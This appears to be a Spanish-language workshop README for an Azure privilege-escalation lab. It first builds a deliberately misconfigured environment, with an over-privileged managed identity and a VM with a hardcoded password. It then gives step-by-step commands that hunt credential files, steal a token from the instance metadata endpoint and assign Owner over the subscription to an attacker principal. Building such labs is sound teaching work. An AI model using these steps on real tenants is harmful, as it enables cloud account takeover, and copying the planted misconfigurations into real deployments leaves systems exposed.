# Escalada-de-Privilegios-en-Azure

# escenario 


# Arquitectura de referencia

![privilege escalation drawio](https://github.com/user-attachments/assets/65372600-4578-4617-b7be-b849b54db399)


## Fase 1: Configuración del Entorno Vulnerable

### Paso 1: Crear un Grupo de Recursos

Este grupo de recursos contendrá todos los elementos del laboratorio.

az group create --name lab-escalation --location eastus

### Paso 2: Crear una Identidad Administrada Asignada por el Usuario

Esta identidad tendrá permisos elevados que serán explotados más adelante.

az identity create --name labidentity --resource-group lab-escalation

### Paso 3: Introducir la Vulnerabilidad Principal

Asignamos el rol de User Access Administrator a la identidad sobre toda la suscripción. Este es un privilegio excesivo y el núcleo de la vulnerabilidad, ya que este rol permite gestionar los permisos de otros usuarios.

Obtener el ID de la suscripción

subscriptionId=$(az account show --query id --output tsv)

Obtener el ID de la entidad de servicio de la identidad administrada

identityPrincipalId=$(az identity show --name "labidentity" --resource-group "lab-escalation" --query principalId --output tsv)

 Asignar el rol de "User Access Administrator" a la identidad administrada sobre toda la suscripción
 ESTE ES EL CAMBIO CLAVE
 
az role assignment create \
    --assignee $identityPrincipalId \
    --role "User Access Administrator" \
    --scope "/subscriptions/$subscriptionId"


### Paso 4: Crear una Máquina Virtual y Asignarle la Identidad Administrada

Esta VM será el punto de entrada para los participantes.

az vm create \
    --resource-group "lab-escalation" \
    --name "compromised-vm" \
    --image "Ubuntu2204" \
    --admin-username "franklin" \
    --admin-password "Franklin.123456" \
    --assign-identity "labidentity"

### Paso 5: Crear un Usuario con Permisos Limitados

Creamos un Service Principal con permisos para ejecutar comandos en la VM. El rol Virtual Machine Contributor es necesario para permitir la ejecución de run-command.

Obtener el ID de la VM

vmId=$(az vm show --resource-group "lab-escalation" --name "compromised-vm" --query id --output tsv))

Crear el Service Principal con permisos sobre la VM

sp_credentials=$(az ad sp create-for-rbac --name "attacker-sp" --role "Virtual Machine Contributor" --scopes $vmId)

Mostrar las credenciales que se entregarán a los participantes

echo "--- Credenciales para los Participantes del Workshop ---"

echo $sp_credentials

echo "--------------------------------------------------------"




¡Importante! ejecuta el archivo create-lab.sh en la consola de azure para  desplegar todo lo anterior mencionado y ademas las herramientas que se utilizaran en la maquina virtual vulnerable.

## Fase 2: Ejecución de la Escalada de Privilegios 

hacemos busqueda de credenciales con el siguiente script:

find / -type f -iname "credentials*" 2>/dev/null -exec grep -iH "password" {} \;

### 2.1. Obtener Acceso Inicial y Verificar Control
Iniciar sesión con las credenciales de atacante y confirmar que se pueden ejecutar comandos en la VM.

1. Iniciar sesión con las credenciales proporcionadas
   
az login --service-principal \
    -u "EL_APPID_PROPORCIONADO" \
    -p "EL_PASSWORD_PROPORCIONADO" \
    --tenant "EL_TENANT_ID_PROPORCIONADO"


### 2. Descubrimiento de la Identidad Administrada

Dentro de la VM (simulado a través de run-command), el siguiente paso es descubrir la identidad administrada.

Este script completo se ejecuta dentro de la VM para obtener el token y listar recursos

  1. Obtener el token de acceso de la identidad, usando jq para extraerlo
     
        token=$(curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H Metadata:true | jq -r .access_token)

 
  
        
 2. Usar el token para realizar una llamada a la API de Azure y listar recursos

  Obtener nombre del grupo de recursos:

  az group list --output table  

 curl -s -X GET -H "Authorization: Bearer $token" "https://management.azure.com/subscriptions/$(az account show --query id -o tsv)/resourceGroups/lab-escalation/resources?api-version=2021-04-01"

  Copia el nombre de la identidad administrada y el nombre del grupo de recursos para ejecutar el siguiente script

  PRINCIPAL_ID=$(az identity show --name "labidentity" --resource-group "lab-escalation" --query 'principalId' -o tsv)

  echo "Principal ID: $PRINCIPAL_ID"

  Despues comprueba con el ID  de la identidad administrada que rol tiene asignado ejecutando lo siguiente:
  
  az role assignment list --assignee "$PRINCIPAL_ID" --query "[].{Role:roleDefinitionName, Scope:scope}" -o table    
  

### Paso 2.1: Escalada Final a Propietario (Owner)
Utilizar el poder adquirido para tomar control total.

A. (En la máquina local) Obtener el Object ID del Service Principal atacante

user_object_id=$(az ad sp list --display-name "attacker-sp" --query "[0].id" -o tsv)
echo "El Object ID del atacante es: $user_object_id"

consultamos el suscription ID con el siguiente comando:
az account list --output table

B. (Ejecutado en la VM) Usar la identidad para asignar el rol de Owner al atacante

  Reemplaza <Tu_Object_ID> y <ID_de_tu_Suscripcion> con tus valores.
  
  az login --identity > /dev/null 2>&1


  Asignar el rol de Propietario al Object ID del atacante
  
  az role assignment create --assignee "<Tu_Object_ID>" --role "Owner" --scope "/subscriptions/<ID_de_tu_Suscripcion>"

    
Resultado Esperado: Una salida JSON que confirma la creación de la nueva asignación de rol.

para deslogearte de la identidad administrada ejecuta el siguiente script

az logout

e inicia sesion con el owner que es el service principal

az login --service-principal \
    -u "EL_APPID_PROPORCIONADO" \
    -p "EL_PASSWORD_PROPORCIONADO" \
    --tenant "EL_TENANT_ID_PROPORCIONADO"

(En la máquina local) El atacante, ahora Owner, Consulta los grupos de recursos existentes.

Consultemos nuevamente que grupos de recursos existen 

az group list --output table

Ahora crea uno nuevo para comprobar los permisos:

az group create --name "prueba-de-control-total" --location "westus"

Vuelve a consultar para confirmar la creacion.

az group list --output table
